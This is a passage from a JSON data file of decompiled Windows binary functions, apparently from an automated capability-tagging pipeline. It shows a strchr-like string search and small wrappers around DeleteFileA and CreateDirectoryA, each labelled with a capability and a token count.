        "decompiled_code": "\nuint32_t * fcn.0042b000(uint32_t *param_1, char param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar1 = param_1 & 3;\n    while (uVar1 != 0) {\n        if (*param_1 == param_2) {\n            return param_1;\n        }\n        if (*param_1 == '\\0') {\n            return NULL;\n        }\n        uVar1 = param_1 + 1 & 3;\n        param_1 = param_1 + 1;\n    }\n    while( true ) {\n        while( true ) {\n            uVar1 = *param_1;\n            uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2, param_2), CONCAT11(param_2, param_2));\n            uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;\n            puVar5 = param_1 + 1;\n            if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;\n            param_1 = puVar5;\n            if ((uVar3 & 0x81010100) != 0) {\n                if ((uVar3 & 0x1010100) != 0) {\n                    return NULL;\n                }\n                if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {\n                    return NULL;\n                }\n            }\n        }\n        uVar1 = *param_1;\n        if (uVar1 == param_2) {\n            return param_1;\n        }\n        if (uVar1 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 8;\n        if (cVar2 == param_2) {\n            return param_1 + 1;\n        }\n        if (cVar2 == '\\0') break;\n        cVar2 = uVar1 >> 0x10;\n        if (cVar2 == param_2) {\n            return param_1 + 2;\n        }\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n        cVar2 = uVar1 >> 0x18;\n        if (cVar2 == param_2) {\n            return param_1 + 3;\n        }\n        param_1 = puVar5;\n        if (cVar2 == '\\0') {\n            return NULL;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 591
    },
    "004227e9": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004227e9(uint lpFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.DLL_DeleteFileA)(lpFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.DLL_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.00426e30(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 120
    },
    "004232df": {
        "rules": [
            "create directory"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004232df(uint lpPathName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.DLL_CreateDirectoryA)(lpPathName, 0);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.DLL_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.00426e30(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 124
    }
}